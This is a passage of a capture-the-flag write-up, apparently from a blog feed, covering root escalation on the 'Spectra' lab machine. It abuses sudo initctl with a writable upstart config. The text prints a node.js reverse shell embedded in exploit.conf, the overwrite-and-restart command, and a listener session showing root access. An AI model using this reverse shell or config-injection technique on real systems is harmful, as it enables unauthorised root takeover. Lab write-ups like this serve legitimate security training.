-    <span class="m">32103</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test.conf
-    <span class="m">32126</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test8.conf
-    <span class="m">32128</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test9.conf
-    <span class="m">32106</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test10.conf
-    <span class="m">32108</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test2.conf
-    <span class="m">32120</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test5.conf
-    <span class="m">32105</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test1.conf
-    <span class="m">23763</span>      <span class="m">4</span> -rwxrwxr-x   <span class="m">1</span> root     developers      <span class="m">251</span> Jun <span class="m">29</span>  <span class="m">2020</span> /srv/nodetest.js
-</code></pre></div><p>These <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  The JS file itself is not that important here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
-description <span class="s2">&#34;Test node.js server&#34;</span>
-author      <span class="s2">&#34;katie&#34;</span>
-
-start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
-stop on shutdown
-
-script
-
-    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
-    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
-    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
-
-end script
-
-pre-start script
-    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
-end script
-
-pre-stop script
-    rm /var/run/nodetest.pid
-    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
-end script
-</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
-<p>With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.</p>
-<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
-<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
-$ cat exploit.conf
-description <span class="s2">&#34;Test node.js server&#34;</span>
-author      <span class="s2">&#34;katie&#34;</span>
-
-start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
-stop on shutdown
-
-script
-
-    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
-    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
-    <span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>10.10.14.21
-    <span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">9001</span>
-    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span class="s1">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
-</span><span class="s1">    this.pipe(sh.stdin);
-</span><span class="s1">    sh.stdout.pipe(this);
-</span><span class="s1">    sh.stderr.pipe(this);
-</span><span class="s1">    })&#39;</span>
-    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
-
-end script
-</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
-$ scp exploit.conf katie@10.10.10.229:/dev/shm
-Password:
-bash: warning: /home/katie/.bashrc: warning: script from noexec mount<span class="p">;</span> see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
-exploit.conf                               100%  <span class="m">775</span>    13.1KB/s   00:00
-</code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null<span class="p">;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span class="o">&amp;&amp;</span> sudo /sbin/initctl start test5
-test5 start/running, process <span class="m">33889</span>
-</code></pre></div><p>If I check my listener, I have a root shell now.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21»
-$ nc -nvlp <span class="m">9001</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
-connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">37220</span>
-id <span class="o">&amp;&amp;</span> hostname <span class="o">&amp;&amp;</span> ip a
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-spectra
-1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-    inet6 ::1/128 scope host
-       valid_lft forever preferred_lft forever
-2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
-    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
-       valid_lft forever preferred_lft forever
-    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
-       valid_lft 86303sec preferred_lft 14303sec
-    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
-       valid_lft 86303sec preferred_lft 14303sec
-    inet6 fe80::250:56ff:feb9:b2c/64 scope link
-       valid_lft forever preferred_lft forever
-</code></pre></div><p><img class="img-container" src="imgs/image-20210715085053464.png" alt="image-20210715085053464"  />
-</p>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
-<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
-<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
 </ul>
 ]]></content:encoded>
     </item>
